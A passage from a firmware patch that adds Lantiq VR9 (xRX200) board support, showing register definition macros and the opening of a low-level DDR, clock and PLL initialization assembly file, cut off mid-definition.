+#define V_RXIIR1_CFG_FMASK     (0x1F7FFFF)
+#define V_RXIIR2_CFG           VFDF_GLOBAL(0x0018)
+#define V_RXIIR2_CFG_WMASK     (0xF00FF)
+#define V_RXIIR2_CFG_MASK      (0xF00FF)
+#define V_RXIIR2_CFG_DEFAULT   (0x0000)
+#define V_RXIIR2_CFG_FMASK     (0xF00FF)
+#define V_INTERP_CFG           VFDF_GLOBAL(0x001C)
+#define V_INTERP_CFG_WMASK     (0xF0F21F07)
+#define V_INTERP_CFG_MASK      (0xF0F21F07)
+#define V_INTERP_CFG_DEFAULT   (0x80020000)
+#define V_INTERP_CFG_FMASK     (0xF0F21F07)
+#define V_DECIM_CFG            VFDF_GLOBAL(0x0020)
+#define V_DECIM_CFG_WMASK      (0xFFF13F1F)
+#define V_DECIM_CFG_MASK       (0xFFF13F1F)
+#define V_DECIM_CFG_DEFAULT    (0x80000000)
+#define V_DECIM_CFG_FMASK      (0xFFF13F1F)
+#define V_DEC_CFG              VFDF_GLOBAL(0x0024)
+#define V_DEC_CFG_WMASK        (0xFF3F7F7F)
+#define V_DEC_CFG_MASK         (0xFF3F7F7F)
+#define V_DEC_CFG_DEFAULT      (0x0000)
+#define V_DEC_CFG_FMASK        (0xFF3F7F7F)
+#define V_TDQ_CFG              VFDF_GLOBAL(0x0028)
+#define V_TDQ_CFG_WMASK        (0x2FE001E0)
+#define V_TDQ_CFG_MASK         (0x2FE001E0)
+#define V_TDQ_CFG_DEFAULT      (0x0000)
+#define V_TDQ_CFG_FMASK        (0x2FE001E0)
+#define V_DEC_CAPTURE          VFDF_GLOBAL(0x002C)
+#define V_DEC_CAPTURE_WMASK    (0x700007FE)
+#define V_DEC_CAPTURE_MASK     (0x7FFFFFFE)
+#define V_DEC_CAPTURE_DEFAULT  (0x1800)
+#define V_DEC_CAPTURE_FMASK    (0x7FFFFFFE)
+#define V_ADAPT_CTRL           VFDF_GLOBAL(0x0030)
+#define V_ADAPT_CTRL_WMASK     (0x0EE6)
+#define V_ADAPT_CTRL_MASK      (0x0EEF)
+#define V_ADAPT_CTRL_DEFAULT   (0x0000)
+#define V_ADAPT_CTRL_FMASK     (0x0EEE)
+#define V_TX_VARGAIN           VFDF_GLOBAL(0x0034)
+#define V_TX_VARGAIN_WMASK     (0xFFFFF)
+#define V_TX_VARGAIN_MASK      (0xFFFFF)
+#define V_TX_VARGAIN_DEFAULT   (0x0000)
+#define V_TX_VARGAIN_FMASK     (0xFFFFF)
+#define V_TX_AVARGAIN          VFDF_GLOBAL(0x0038)
+#define V_TX_AVARGAIN_WMASK    (0xFFFFF)
+#define V_TX_AVARGAIN_MASK     (0xFFFFF)
+#define V_TX_AVARGAIN_DEFAULT  (0x0000)
+#define V_TX_AVARGAIN_FMASK    (0xFFFFF)
+#define V_RX_VARGAIN           VFDF_GLOBAL(0x003C)
+#define V_RX_VARGAIN_WMASK     (0x7FFFF)
+#define V_RX_VARGAIN_MASK      (0x7FFFF)
+#define V_RX_VARGAIN_DEFAULT   (0x0000)
+#define V_RX_VARGAIN_FMASK     (0x7FFFF)
+#define V_RX_AVARGAIN          VFDF_GLOBAL(0x0040)
+#define V_RX_AVARGAIN_WMASK    (0x7FFFF)
+#define V_RX_AVARGAIN_MASK     (0x7FFFF)
+#define V_RX_AVARGAIN_DEFAULT  (0x0000)
+#define V_RX_AVARGAIN_FMASK    (0x7FFFF)
+#define V_ADC_ADJUST           VFDF_GLOBAL(0x0044)
+#define V_ADC_ADJUST_WMASK     (0xFFFFF)
+#define V_ADC_ADJUST_MASK      (0xFFFFF)
+#define V_ADC_ADJUST_DEFAULT   (0x0000)
+#define V_ADC_ADJUST_FMASK     (0xFFFFF)
+#define V_FRAME_SKEW           VFDF_GLOBAL(0x0048)
+#define V_FRAME_SKEW_WMASK     (0x1000000)
+#define V_FRAME_SKEW_MASK      (0x100FFFF)
+#define V_FRAME_SKEW_DEFAULT   (0x0000)
+#define V_FRAME_SKEW_FMASK     (0xFFFF)
+#define V_TX_EXTEN             VFDF_GLOBAL(0x004C)
+#define V_TX_EXTEN_WMASK       (0x17FFFFFF)
+#define V_TX_EXTEN_MASK        (0x17FFFFFF)
+#define V_TX_EXTEN_DEFAULT     (0x0000)
+#define V_TX_EXTEN_FMASK       (0x17FFFFFF)
+#define V_TX_EXTEN_A           VFDF_GLOBAL(0x0050)
+#define V_TX_EXTEN_A_WMASK     (0x17FFFFFF)
+#define V_TX_EXTEN_A_MASK      (0x17FFFFFF)
+#define V_TX_EXTEN_A_DEFAULT   (0x0000)
+#define V_TX_EXTEN_A_FMASK     (0x17FFFFFF)
+#define V_TX_BETA              VFDF_GLOBAL(0x0054)
+#define V_TX_BETA_WMASK        (0x01FF)
+#define V_TX_BETA_MASK         (0x01FF)
+#define V_TX_BETA_DEFAULT      (0x0000)
+#define V_TX_BETA_FMASK        (0x01FF)
+#define V_TX_BETA_A            VFDF_GLOBAL(0x0058)
+#define V_TX_BETA_A_WMASK      (0x01FF)
+#define V_TX_BETA_A_MASK       (0x01FF)
+#define V_TX_BETA_A_DEFAULT    (0x0000)
+#define V_TX_BETA_A_FMASK      (0x01FF)
+#define V_TX_FSIZE             VFDF_GLOBAL(0x005C)
+#define V_TX_FSIZE_WMASK       (0xF3FFF)
+#define V_TX_FSIZE_MASK        (0xF3FFF)
+#define V_TX_FSIZE_DEFAULT     (0x0000)
+#define V_TX_FSIZE_FMASK       (0xF3FFF)
+#define V_TX_FSIZE_A           VFDF_GLOBAL(0x0060)
+#define V_TX_FSIZE_A_WMASK     (0xF3FFF)
+#define V_TX_FSIZE_A_MASK      (0xF3FFF)
+#define V_TX_FSIZE_A_DEFAULT   (0x0000)
+#define V_TX_FSIZE_A_FMASK     (0xF3FFF)
+#define V_FSOFFSET_IN          VFDF_GLOBAL(0x0064)
+#define V_FSOFFSET_IN_WMASK    (0x3FFF)
+#define V_FSOFFSET_IN_MASK     (0x3FFF)
+#define V_FSOFFSET_IN_DEFAULT  (0x0000)
+#define V_FSOFFSET_IN_FMASK    (0x3FFF)
+#define V_FSOFFSET_ER          VFDF_GLOBAL(0x0068)
+#define V_FSOFFSET_ER_WMASK    (0x3FFF)
+#define V_FSOFFSET_ER_MASK     (0x3FFF)
+#define V_FSOFFSET_ER_DEFAULT  (0x0000)
+#define V_FSOFFSET_ER_FMASK    (0x3FFF)
+#define V_RX_EXTEN             VFDF_GLOBAL(0x006C)
+#define V_RX_EXTEN_WMASK       (0x1FFFFFFF)
+#define V_RX_EXTEN_MASK        (0x1FFFFFFF)
+#define V_RX_EXTEN_DEFAULT     (0x0000)
+#define V_RX_EXTEN_FMASK       (0x1FFFFFFF)
+#define V_RX_EXTEN_A           VFDF_GLOBAL(0x0070)
+#define V_RX_EXTEN_A_WMASK     (0x1FFFFFFF)
+#define V_RX_EXTEN_A_MASK      (0x1FFFFFFF)
+#define V_RX_EXTEN_A_DEFAULT   (0x0000)
+#define V_RX_EXTEN_A_FMASK     (0x1FFFFFFF)
+#define V_RX_WSIZE             VFDF_GLOBAL(0x0074)
+#define V_RX_WSIZE_WMASK       (0x01FF)
+#define V_RX_WSIZE_MASK        (0x01FF)
+#define V_RX_WSIZE_DEFAULT     (0x0000)
+#define V_RX_WSIZE_FMASK       (0x01FF)
+#define V_RX_WSIZE_A           VFDF_GLOBAL(0x0078)
+#define V_RX_WSIZE_A_WMASK     (0x01FF)
+#define V_RX_WSIZE_A_MASK      (0x01FF)
+#define V_RX_WSIZE_A_DEFAULT   (0x0000)
+#define V_RX_WSIZE_A_FMASK     (0x01FF)
+#define V_RX_FSIZE             VFDF_GLOBAL(0x007C)
+#define V_RX_FSIZE_WMASK       (0xF3FFF)
+#define V_RX_FSIZE_MASK        (0xF3FFF)
+#define V_RX_FSIZE_DEFAULT     (0x0000)
+#define V_RX_FSIZE_FMASK       (0xF3FFF)
+#define V_RX_FSIZE_A           VFDF_GLOBAL(0x0080)
+#define V_RX_FSIZE_A_WMASK     (0xF3FFF)
+#define V_RX_FSIZE_A_MASK      (0xF3FFF)
+#define V_RX_FSIZE_A_DEFAULT   (0x0000)
+#define V_RX_FSIZE_A_FMASK     (0xF3FFF)
+#define V_SERDES_XBAR          VFDF_GLOBAL(0x0084)
+#define V_SERDES_XBAR_WMASK    (0x0301)
+#define V_SERDES_XBAR_MASK     (0x0301)
+#define V_SERDES_XBAR_DEFAULT  (0x0000)
+#define V_SERDES_XBAR_FMASK    (0x0301)
+#define V_SRCFR                VFDF_GLOBAL(0x0088)
+#define V_SRCFR_WMASK          (0xFFFFF)
+#define V_SRCFR_MASK           (0xFFFFF)
+#define V_SRCFR_DEFAULT        (0x0000)
+#define V_SRCFR_FMASK          (0xFFFFF)
+#define V_SRCCTL               VFDF_GLOBAL(0x008C)
+#define V_SRCCTL_WMASK         (0xFFFFFF)
+#define V_SRCCTL_MASK          (0xFFFFFF)
+#define V_SRCCTL_DEFAULT       (0x0000)
+#define V_SRCCTL_FMASK         (0xFFFFFF)
+#define V_SRC_CFG              VFDF_GLOBAL(0x0090)
+#define V_SRC_CFG_WMASK        (0xC0F3007F)
+#define V_SRC_CFG_MASK         (0xC0F3007F)
+#define V_SRC_CFG_DEFAULT      (0x0000)
+#define V_SRC_CFG_FMASK        (0xC0F3007F)
+#define V_HBFILT_CFG           VFDF_GLOBAL(0x0094)
+#define V_HBFILT_CFG_WMASK     (0xF0F10000)
+#define V_HBFILT_CFG_MASK      (0xF0F10000)
+#define V_HBFILT_CFG_DEFAULT   (0x0000)
+#define V_HBFILT_CFG_FMASK     (0xF0F10000)
+#define V_AFE_SERIAL_CFG       VFDF_GLOBAL(0x0098)
+#define V_AFE_SERIAL_CFG_WMASK (0x800FFFFF)
+#define V_AFE_SERIAL_CFG_MASK  (0xC00FFFFF)
+#define V_AFE_SERIAL_CFG_DEFAULT (0x0010)
+#define V_AFE_SERIAL_CFG_FMASK (0x400FFFFF)
+#define V_AFE_SERIAL_ADDR      VFDF_GLOBAL(0x009C)
+#define V_AFE_SERIAL_ADDR_WMASK (0x3FFF)
+#define V_AFE_SERIAL_ADDR_MASK (0x3FFF)
+#define V_AFE_SERIAL_ADDR_DEFAULT (0x0000)
+#define V_AFE_SERIAL_ADDR_FMASK (0x3FFF)
+#define V_AFE_SERIAL_WDATA     VFDF_GLOBAL(0x00A0)
+#define V_AFE_SERIAL_WDATA_WMASK (0xFFFF)
+#define V_AFE_SERIAL_WDATA_MASK (0xFFFF)
+#define V_AFE_SERIAL_WDATA_DEFAULT (0x0000)
+#define V_AFE_SERIAL_WDATA_FMASK (0xFFFF)
+#define V_AFE_SERIAL_RDATA     VFDF_GLOBAL(0x00A4)
+#define V_AFE_SERIAL_RDATA_WMASK (0x0000)
+#define V_AFE_SERIAL_RDATA_MASK (0xFFFF)
+#define V_AFE_SERIAL_RDATA_DEFAULT (0x0000)
+#define V_AFE_SERIAL_RDATA_FMASK (0xFFFF)
+
+#endif
+
diff --git a/board/vr9/lowlevel_init.S b/board/vr9/lowlevel_init.S
new file mode 100755
--- /dev/null
+++ b/board/vr9/lowlevel_init.S
@@ -0,0 +1,1093 @@
+
+/*
+ *  Memory sub-system initialization code for INCA-IP2 development board.
+ *  Andre Messerschmidt
+ *  Copyright (c) 2005  Infineon Technologies AG 
+ *
+ *  Based on Inca-IP code 
+ *  Copyright (c) 2003  Wolfgang Denk <wd@denx.de>
+ *
+ * See file CREDITS for list of people who contributed to this
+ * project.
+ *
+ * This program is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU General Public License as
+ * published by the Free Software Foundation; either version 2 of
+ * the License, or (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA 02111-1307 USA
+ */
+/* History:
+      Wu Qi Ming Sep 18, 2009 initial version
+ */
+#include <config.h>
+#include <version.h>
+#include <asm/regdef.h>
+#include <asm/mipsregs.h>
+
+#ifdef CONFIG_VR9_DDR1
+  #ifdef CONFIG_VR9_CPU_333M_RAM_166M
+   #ifdef CONFIG_ENABLE_POWER_MANAGEMENT
+    #include "ddr1/xrx200_ddr1_167M_lp_settings.h"
+   #else
+    #include "ddr1/xrx200_ddr1_167M_settings.h"
+   #endif
+  #elif defined(CONFIG_VR9_CPU_393M_RAM_196M)
+    #ifdef CONFIG_ENABLE_POWER_MANAGEMENT
+        #include "ddr1/xrx200_ddr1_200M_lp_settings.h"
+	#else
+        #include "ddr1/xrx200_ddr1_200M_settings.h"
+	#endif	
+  #else /*500M/200M, use the same ddr setting file*/
+    #include "ddr1/xrx200_ddr1_200M_settings.h"
+  #endif
+#endif
+
+#ifdef CONFIG_VR9_DDR2
+  #if defined(CONFIG_VR9_CPU_393M_RAM_196M) || defined(CONFIG_VR9_CPU_500M_RAM_200M) || defined(CONFIG_VR9_CPU_600M_RAM_200M)
+   #ifdef CONFIG_ENABLE_POWER_MANAGEMENT
+       #include "ddr2/xrx200_ddr2_200M_lp_settings.h"
+   #else
+       #ifdef   CONFIG_VRX220_W2
+           #include "ddr2/xrx200_ddr2_200M_128M_settings.h"
+       #else
+           #include "ddr2/xrx200_ddr2_200M_settings.h"
+       #endif
+   #endif	
+  #elif defined(CONFIG_VR9_CPU_500M_RAM_250M) 
+   #ifdef CONFIG_ENABLE_POWER_MANAGEMENT
+       #include "ddr2/xrx200_ddr2_250M_lp_settings.h"
+   #elif defined(CONFIG_VR9_EVM_DUAL_DDR)
+       #include "ddr2/evm_dual_ddr_xrx200_ddr2_250M_settings.h"
+   #else
+       #include "ddr2/xrx200_ddr2_250M_settings.h"
+   #endif
+  #elif defined(CONFIG_VR9_CPU_600M_RAM_300M) 
+   #ifdef CONFIG_ENABLE_POWER_MANAGEMENT
+       #include "ddr2/xrx200_ddr2_300M_lp_settings.h"
+   #else
+       #include "ddr2/xrx200_ddr2_300M_settings.h"
+   #endif 
+  #else /*333M/166M, use the same ddr setting file*/
+   #ifdef CONFIG_ENABLE_POWER_MANAGEMENT
+       #include "ddr2/xrx200_ddr2_167M_lp_settings.h"
+   #else
+       #include "ddr2/xrx200_ddr2_167M_settings.h"
+   #endif
+  #endif
+#endif
+
+#define PMU_OFFSET  0xBF102000
+#define PMU_PWDCR1  (PMU_OFFSET + 0x0024)
+
+#define CGU_OFFSET  0xBF103000
+#define PLL0_CFG    (CGU_OFFSET + 0x0004)
+#define PLL1_CFG    (CGU_OFFSET + 0x0008)    
+#define CGU_SYS     (CGU_OFFSET + 0x000C)
+#define CGU_CLKFSR  (CGU_OFFSET + 0x0010)
+#define CGU_CLKGSR  (CGU_OFFSET + 0x0014)
+#define CGU_CLKGCR0 (CGU_OFFSET + 0x0018)
+#define CGU_CLKGCR1 (CGU_OFFSET + 0x001C)
+#define CGU_UPDATE  (CGU_OFFSET + 0x0020)
+#define IF_CLK      (CGU_OFFSET + 0x0024)
+#define CGU_DDR     (CGU_OFFSET + 0x0028)
+#define CGU_CT1SR   (CGU_OFFSET + 0x002C)
+#define CGU_CT_KVAL (CGU_OFFSET + 0x0030)
+#define CGU_PCMCR   (CGU_OFFSET + 0x0034)
+#define PCI_CR      (CGU_OFFSET + 0x0038)
+#define GPHY1_Cfg   (CGU_OFFSET + 0x0040)
+#define GPHY0_Cfg   (CGU_OFFSET + 0x004C)
+#define PLL2_CFG    (CGU_OFFSET + 0x0060)
+
+
+#define RCU_OFFSET   0xBF203000
+#define RST_REQ      (RCU_OFFSET + 0x0010)
+
+#define DDR_OFFSET   0xbf401000
+#define DDR_CCR00      (DDR_OFFSET + 0x0000 )
+#define DDR_CCR01      (DDR_OFFSET + 0x0010 )
+#define DDR_CCR02      (DDR_OFFSET + 0x0020 )
+#define DDR_CCR03      (DDR_OFFSET + 0x0030 )
+#define DDR_CCR04      (DDR_OFFSET + 0x0040 )
+#define DDR_CCR05      (DDR_OFFSET + 0x0050 )
+#define DDR_CCR06      (DDR_OFFSET + 0x0060 )
+#define DDR_CCR07      (DDR_OFFSET + 0x0070 )
+#define DDR_CCR08      (DDR_OFFSET + 0x0080 )
+#define DDR_CCR09      (DDR_OFFSET + 0x0090 )
+#define DDR_CCR10      (DDR_OFFSET + 0x00A0 )
+#define DDR_CCR11      (DDR_OFFSET + 0x00B0 )
+#define DDR_CCR12      (DDR_OFFSET + 0x00C0 )
+#define DDR_CCR13      (DDR_OFFSET + 0x00D0 )
+#define DDR_CCR14      (DDR_OFFSET + 0x00E0 )
+#define DDR_CCR15      (DDR_OFFSET + 0x00F0 )
+#define DDR_CCR16      (DDR_OFFSET + 0x0100 )
+#define DDR_CCR17      (DDR_OFFSET + 0x0110 )
+#define DDR_CCR18      (DDR_OFFSET + 0x0120 )
+#define DDR_CCR19      (DDR_OFFSET + 0x0130 )
+#define DDR_CCR20      (DDR_OFFSET + 0x0140 )
+#define DDR_CCR21      (DDR_OFFSET + 0x0150 )
+#define DDR_CCR22      (DDR_OFFSET + 0x0160 )
+#define DDR_CCR23      (DDR_OFFSET + 0x0170 )
+#define DDR_CCR24      (DDR_OFFSET + 0x0180 )
+#define DDR_CCR25      (DDR_OFFSET + 0x0190 )
+#define DDR_CCR26      (DDR_OFFSET + 0x01A0 )
+#define DDR_CCR27      (DDR_OFFSET + 0x01B0 )
+#define DDR_CCR28      (DDR_OFFSET + 0x01C0 )
+#define DDR_CCR29      (DDR_OFFSET + 0x01D0 )
+#define DDR_CCR30      (DDR_OFFSET + 0x01E0 )
+#define DDR_CCR31      (DDR_OFFSET + 0x01F0 )
+#define DDR_CCR32      (DDR_OFFSET + 0x0200 )
+#define DDR_CCR33      (DDR_OFFSET + 0x0210 )
+#define DDR_CCR34      (DDR_OFFSET + 0x0220 )
+#define DDR_CCR35      (DDR_OFFSET + 0x0230 )
+#define DDR_CCR36      (DDR_OFFSET + 0x0240 )
+#define DDR_CCR37      (DDR_OFFSET + 0x0250 )
+#define DDR_CCR38      (DDR_OFFSET + 0x0260 )
+#define DDR_CCR39      (DDR_OFFSET + 0x0270 )
+#define DDR_CCR40      (DDR_OFFSET + 0x0280 )
+#define DDR_CCR41      (DDR_OFFSET + 0x0290 )
+#define DDR_CCR42      (DDR_OFFSET + 0x02A0 )
+#define DDR_CCR43      (DDR_OFFSET + 0x02B0 )
+#define DDR_CCR44      (DDR_OFFSET + 0x02C0 )
+#define DDR_CCR45      (DDR_OFFSET + 0x02D0 )
+#define DDR_CCR46      (DDR_OFFSET + 0x02E0 )
+#define DDR_CCR47      (DDR_OFFSET + 0x02F0 )
+#define DDR_CCR48      (DDR_OFFSET + 0x0300 )
+#define DDR_CCR49      (DDR_OFFSET + 0x0310 )
+#define DDR_CCR50      (DDR_OFFSET + 0x0320 )
+#define DDR_CCR51      (DDR_OFFSET + 0x0330 )
+#define DDR_CCR52      (DDR_OFFSET + 0x0340 )
+#define DDR_CCR53      (DDR_OFFSET + 0x0350 )
+#define DDR_CCR54      (DDR_OFFSET + 0x0360 )
+#define DDR_CCR55      (DDR_OFFSET + 0x0370 )
+#define DDR_CCR56      (DDR_OFFSET + 0x0380 )
+#define DDR_CCR57      (DDR_OFFSET + 0x0390 )
+#define DDR_CCR58      (DDR_OFFSET + 0x03A0 )
+#define DDR_CCR59      (DDR_OFFSET + 0x03B0 )
+#define DDR_CCR60      (DDR_OFFSET + 0x03C0 )
+#define DDR_CCR61      (DDR_OFFSET + 0x03D0 )
+#define DDR_CCR62      (DDR_OFFSET + 0x03E0 )
+#define DDR_CCR63      (DDR_OFFSET + 0x03F0 )
+#define DDR_CCR64      (DDR_OFFSET + 0x0400 )
+#define DDR_CCR65      (DDR_OFFSET + 0x0410 )
+#define DDR_CCR66      (DDR_OFFSET + 0x0420 )
+#define DDR_CCR67      (DDR_OFFSET + 0x0430 )
+#define DDR_CCR68      (DDR_OFFSET + 0x0440 )
+#define DDR_CCR69      (DDR_OFFSET + 0x0450 )
+#define DDR_CCR70      (DDR_OFFSET + 0x0460 )
+#define DDR_CCR71      (DDR_OFFSET + 0x0470 )
+#define DDR_CCR72      (DDR_OFFSET + 0x0480 )
+#define DDR_CCR73      (DDR_OFFSET + 0x0490 )
+#define DDR_CCR74      (DDR_OFFSET + 0x04A0 )
+#define DDR_CCR75      (DDR_OFFSET + 0x04B0 )
+#define DDR_CCR76      (DDR_OFFSET + 0x04C0 )
+#define DDR_CCR77      (DDR_OFFSET + 0x04D0 )
+#define DDR_CCR78      (DDR_OFFSET + 0x04E0 )
+#define DDR_CCR79      (DDR_OFFSET + 0x04F0 )
+#define DDR_CCR80      (DDR_OFFSET + 0x0500 )
+#define DDR_CCR81      (DDR_OFFSET + 0x0510 )
+#define DDR_CCR82      (DDR_OFFSET + 0x0520 )
+#define DDR_CCR83      (DDR_OFFSET + 0x0530 )
+#define DDR_CCR84      (DDR_OFFSET + 0x0540 )
+#define DDR_CCR85      (DDR_OFFSET + 0x0550 )
+#define DDR_CCR86      (DDR_OFFSET + 0x0560 )
+#define DDR_CCR87      (DDR_OFFSET + 0x0570 )
+#define DDR_CCR88      (DDR_OFFSET + 0x0580 )
+#define DDR_CCR89      (DDR_OFFSET + 0x0590 )
+#define DDR_CCR90      (DDR_OFFSET + 0x05A0 )
+#define DDR_CCR91      (DDR_OFFSET + 0x05B0 )
+#define DDR_CCR92      (DDR_OFFSET + 0x05C0 )
+#define DDR_CCR93      (DDR_OFFSET + 0x05D0 )
+#define DDR_CCR94      (DDR_OFFSET + 0x05E0 )
+#define DDR_CCR95      (DDR_OFFSET + 0x05F0 )
+#define DDR_CCR96      (DDR_OFFSET + 0x0600 )
+#define DDR_CCR97      (DDR_OFFSET + 0x0610 )
+#define DDR_CCR98      (DDR_OFFSET + 0x0620 )
+#define DDR_CCR99      (DDR_OFFSET + 0x0630 )
+#define DDR_CCR100     (DDR_OFFSET + 0x0640 )
+#define DDR_CCR101     (DDR_OFFSET + 0x0650 )
+#define DDR_CCR102     (DDR_OFFSET + 0x0660 )
+#define DDR_CCR103     (DDR_OFFSET + 0x0670 )
+#define DDR_CCR104     (DDR_OFFSET + 0x0680 )
+#define DDR_CCR105     (DDR_OFFSET + 0x0690 )
+#define DDR_CCR106     (DDR_OFFSET + 0x06A0 )
+#define DDR_CCR107     (DDR_OFFSET + 0x06B0 )
+#define DDR_CCR108     (DDR_OFFSET + 0x06C0 )
+#define DDR_CCR109     (DDR_OFFSET + 0x06D0 )
+#define DDR_CCR110     (DDR_OFFSET + 0x06E0 )
+#define DDR_CCR111     (DDR_OFFSET + 0x06F0 )
+#define DDR_CCR112     (DDR_OFFSET + 0x0700 )
+#define DDR_CCR113     (DDR_OFFSET + 0x0710 )
+#define DDR_CCR114     (DDR_OFFSET + 0x0720 )
+#define DDR_CCR115     (DDR_OFFSET + 0x0730 )
+#define DDR_CCR116     (DDR_OFFSET + 0x0740 )
+#define DDR_CCR117     (DDR_OFFSET + 0x0750 )
+#define DDR_CCR118     (DDR_OFFSET + 0x0760 )
+#define DDR_CCR119     (DDR_OFFSET + 0x0770 )
+#define DDR_CCR120     (DDR_OFFSET + 0x0780 )
+#define DDR_CCR121     (DDR_OFFSET + 0x0790 )
+#define DDR_CCR122     (DDR_OFFSET + 0x07A0 )
+#define DDR_CCR123     (DDR_OFFSET + 0x07B0 )
+#define DDR_CCR124     (DDR_OFFSET + 0x07C0 )
+#define DDR_CCR125     (DDR_OFFSET + 0x07D0 )
+#define DDR_CCR126     (DDR_OFFSET + 0x07E0 )
+#define DDR_CCR127     (DDR_OFFSET + 0x07F0 )
+#define DDR_CCR128     (DDR_OFFSET + 0x0800 )
+#define DDR_CCR129     (DDR_OFFSET + 0x0810 )
+#define DDR_CCR130     (DDR_OFFSET + 0x0820 )
+#define DDR_CCR131     (DDR_OFFSET + 0x0830 )
+#define DDR_CCR132     (DDR_OFFSET + 0x0840 )
+#define DDR_CCR133     (DDR_OFFSET + 0x0850 )
+#define DDR_CCR134     (DDR_OFFSET + 0x0860 )
+#define DDR_CCR135     (DDR_OFFSET + 0x0870 )
+#define DDR_CCR136     (DDR_OFFSET + 0x0880 )
+#define DDR_CCR137     (DDR_OFFSET + 0x0890 )
+#define DDR_CCR138     (DDR_OFFSET + 0x08A0 )
+#define DDR_CCR139     (DDR_OFFSET + 0x08B0 )
+#define DDR_CCR140     (DDR_OFFSET + 0x08C0 )
+#define DDR_CCR141     (DDR_OFFSET + 0x08D0 )
+#define DDR_CCR142     (DDR_OFFSET + 0x08E0 )
+#define DDR_CCR143     (DDR_OFFSET + 0x08F0 )
+#define DDR_CCR144     (DDR_OFFSET + 0x0900 )
+#define DDR_CCR145     (DDR_OFFSET + 0x0910 )
+#define DDR_CCR146     (DDR_OFFSET + 0x0920 )
+#define DDR_CCR147     (DDR_OFFSET + 0x0930 )
+#define DDR_CCR148     (DDR_OFFSET + 0x0940 )
+#define DDR_CCR149     (DDR_OFFSET + 0x0950 )
+#define DDR_CCR150     (DDR_OFFSET + 0x0960 )
+#define DDR_CCR151     (DDR_OFFSET + 0x0970 )
+#define DDR_CCR152     (DDR_OFFSET + 0x0980 )
+#define DDR_CCR153     (DDR_OFFSET + 0x0990 )
+#define DDR_CCR154     (DDR_OFFSET + 0x09A0 )
+#define DDR_CCR155     (DDR_OFFSET + 0x09B0 )
+#define DDR_CCR156     (DDR_OFFSET + 0x09C0 )
+#define DDR_CCR157     (DDR_OFFSET + 0x09D0 )
+#define DDR_CCR158     (DDR_OFFSET + 0x09E0 )
+#define DDR_CCR159     (DDR_OFFSET + 0x09F0 )
+#define DDR_CCR160     (DDR_OFFSET + 0x0A00 )
+#define DDR_CCR161     (DDR_OFFSET + 0x0A10 )
+#define DDR_CCR162     (DDR_OFFSET + 0x0A20 )
+#define DDR_CCR163     (DDR_OFFSET + 0x0A30 )
+#define DDR_CCR164     (DDR_OFFSET + 0x0A40 )
+#define DDR_CCR165     (DDR_OFFSET + 0x0A50 )
+#define DDR_CCR166     (DDR_OFFSET + 0x0A60 )
+#define DDR_CCR167     (DDR_OFFSET + 0x0A70 )
+#define DDR_CCR168     (DDR_OFFSET + 0x0A80 )
+#define DDR_CCR169     (DDR_OFFSET + 0x0A90 )
+#define DDR_CCR170     (DDR_OFFSET + 0x0AA0 )
+#define DDR_CCR171     (DDR_OFFSET + 0x0AB0 )
+#define DDR_CCR172     (DDR_OFFSET + 0x0AC0 )
+#define DDR_CCR173     (DDR_OFFSET + 0x0AD0 )
+#define DDR_CCR174     (DDR_OFFSET + 0x0AE0 )
+#define DDR_CCR175     (DDR_OFFSET + 0x0AF0 )
+#define DDR_CCR176     (DDR_OFFSET + 0x0B00 )
+#define DDR_CCR177     (DDR_OFFSET + 0x0B10 )
+#define DDR_CCR178     (DDR_OFFSET + 0x0B20 )
+#define DDR_CCR179     (DDR_OFFSET + 0x0B30 )
+#define DDR_CCR180     (DDR_OFFSET + 0x0B40 )
+#define DDR_CCR181     (DDR_OFFSET + 0x0B50 )
+#define DDR_CCR182     (DDR_OFFSET + 0x0B60 )
+#define DDR_CCR183     (DDR_OFFSET + 0x0B70 )
+#define DDR_CCR184     (DDR_OFFSET + 0x0B80 )
+#define DDR_CCR185     (DDR_OFFSET + 0x0B90 )
+#define DDR_CCR186     (DDR_OFFSET + 0x0BA0 )
+#define DDR_CCR187     (DDR_OFFSET + 0x0BB0 )
+#define DDR_CCR188     (DDR_OFFSET + 0x0BC0 )
+#define DDR_CCR189     (DDR_OFFSET + 0x0BD0 )
+#define DDR_CCR190     (DDR_OFFSET + 0x0BE0 )
+#define DDR_CCR191     (DDR_OFFSET + 0x0BF0 )
+
+#if CONFIG_VR9_CRYSTAL_6M /*6M crystal clock*/
+     #define CONFIG_VR9_PLL0_CFG_VALUE 0x00B00C49
+     #define CONFIG_VR9_PLL1_CFG_VALUE 0x9D267001    
+	   #define CONFIG_VR9_PLL2_CFG_VALUE 0x293011c1
+#elif CONFIG_VR9_CRYSTAL_CPLD /*6M change to 36M via CPLD*/
+     /*fix me, change to the correct value*/
+     #define CONFIG_VR9_PLL0_CFG_VALUE 0x00B00621 
+     #define CONFIG_VR9_PLL1_CFG_VALUE 0x9BA67015 /*default value for 36M crystal*/
+     #define CONFIG_VR9_PLL2_CFG_VALUE 0x293002C1 /*default value for 36M crystal*/
+#elif CONFIG_VR9_CRYSTAL_25M /*25M crystal clock, for GRX288*/
+    /*fix me, change to the correct value*/
+    #define CONFIG_VR9_PLL0_CFG_VALUE 0x00F018D1   /*default value for 25M crystal*/
+    #define CONFIG_VR9_PLL1_CFG_VALUE 0x984E6F4D   /*default value for 25M crystal*/
+    #define CONFIG_VR9_PLL2_CFG_VALUE 0x0A200441
+    #define PLL2_DISABLE	0x0a200000
+	#define PLL2_HIGH_M	    0x0a203ffd
+	#define PLL2_DEFAULT	0x0a200441
+#else /*36M crystal clock, for VRX288*/
+    //#define CONFIG_VR9_PLL0_CFG_VALUE 0x00b01f21 /*default value for 36M crystal*/
+    /*M=2, N(6:0)=49, N(7)=1, */ 
+	#define CONFIG_VR9_PLL0_CFG_VALUE 0x00B02C49
+	#define CONFIG_VR9_PLL1_CFG_VALUE 0x9BA67015 /*default value for 36M crystal*/
+    #define CONFIG_VR9_PLL2_CFG_VALUE 0x293002C1 /*default value for 36M crystal*/
+    #define PLL2_DISABLE	0x29300000
+	#define PLL2_HIGH_M	    0x29302ffd
+	#define PLL2_DEFAULT	0x293002c1
+
+#endif
+
+
+#ifdef CONFIG_VR9_CPU_125M_RAM_125M
+   #define CONFIG_VR9_CGU_SYS_VALUE    0x90
